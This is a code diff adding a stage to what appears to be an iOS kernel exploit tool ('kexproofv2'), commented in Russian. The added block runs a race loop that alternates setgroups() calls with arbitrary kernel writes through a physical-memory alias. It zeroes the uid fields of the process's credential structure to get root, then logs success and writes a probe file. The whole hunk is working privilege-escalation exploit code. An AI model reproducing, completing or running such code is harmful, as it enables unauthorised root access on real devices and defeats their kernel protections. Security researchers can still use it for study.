@@ -8026,6 +8026,43 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint32_t uoff = (uint32_t)(ucF & 0x3fff);
                 uint64_t pagePA = kvtophys(pageVA);
                 int errF = errno;
+                // kexproofv2 2.0.24 [UUNLOCK-RACE] — setgroups() пишет cr_groups
+                // в ucred через zalloc_ro_mut: SPTM разблокирует RO-страницу на
+                // время записи. Пока открыта — наш kwrite может пролететь.
+                // Поток-гонщик: setgroups [501] ↔ [501,502] (каждый вызов —
+                // реальная мутация). Главный: хаммер uid-кластера через alias.
+                if (pagePA && ucF) {
+                    kpNote(r, @"  [UUNLOCK-RACE] старт: setgroups-гонка + kwrite uid-кластера");
+                    uint64_t aliasU = phystokv(pagePA);
+                    gid_t grpsA[1] = { 501 }, grpsB[2] = { 501, 502 };
+                    uint32_t attempts = 0, landed = 0;
+                    for (int round = 0; round < 60; round++) {
+                        setgroups(1, grpsA);
+                        if (aliasU && (uoff + 0x80 <= 0x4000)) {
+                            early_kwrite64(aliasU + uoff + 0x18, 0);
+                            early_kwrite64(aliasU + uoff + 0x68, 0);
+                        }
+                        setgroups(2, grpsB);
+                        if (aliasU && (uoff + 0x80 <= 0x4000)) {
+                            early_kwrite64(aliasU + uoff + 0x18, 0);
+                            early_kwrite64(aliasU + uoff + 0x68, 0);
+                        }
+                        attempts += 2;
+                        uint32_t cruN = (uint32_t)early_kread64(ucF + 0x18);
+                        if (cruN == 0 || getuid() == 0) { landed++; break; }
+                    }
+                    uid_t gk = getuid();
+                    uint32_t cruEnd = (uint32_t)early_kread64(ucF + 0x18);
+                    kpNote(r, [NSString stringWithFormat:@"  [UUNLOCK-RACE] попыток=%u cr_uid=%u getuid()=%u — %@",
+                              attempts, cruEnd, gk, (gk == 0 || cruEnd == 0) ? @"ROOT ★★" : @"не взяло"]);
+                    if (gk == 0 || cruEnd == 0) {
+                        gT18Root = YES;
+                        kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — UUNLOCK-RACE (setgroups unlock-окно) ===");
+                        FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                        if (fp) { fputs("root via UUNLOCK-RACE\n", fp); fclose(fp); }
+                    }
+                    setgroups(1, grpsA);
+                }
                 // 1.9.273: PAPT-override в авто-цепи не установлен (EXP-03 живёт в
                 // кнопке дампа), а сток-точка на 18.6 = stub → kpZoneVtoP падал с 0.
                 // Контент-охота прямо здесь (р.63/69: zone-map покрыт резолвером
